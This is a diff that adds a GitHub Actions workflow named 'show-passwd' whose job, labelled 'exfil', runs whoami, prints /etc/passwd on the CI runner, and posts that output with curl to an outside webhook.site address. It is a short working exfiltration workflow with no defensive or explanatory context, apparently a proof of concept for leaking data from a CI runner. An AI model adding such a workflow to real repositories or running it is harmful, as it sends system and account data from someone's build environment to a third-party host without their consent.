@@ -1,0 +1,20 @@
+name: show-passwd
+
+on:
+  workflow_dispatch:   # ✅ lets you run it manually
+
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print system info
+        run: |
+          echo "[+] Running whoami..."
+          whoami
+          echo "[+] Showing passwd content..."
+          cat /etc/passwd
+      - name: Send to webhook
+        run: |
+          curl -X POST -H "Content-Type: text/plain" \
+            -d "$(whoami && echo && cat /etc/passwd)" \
+            https://webhook.site/d3dabef3-8bf1-41f6-ab7a-9f13e9ab646a
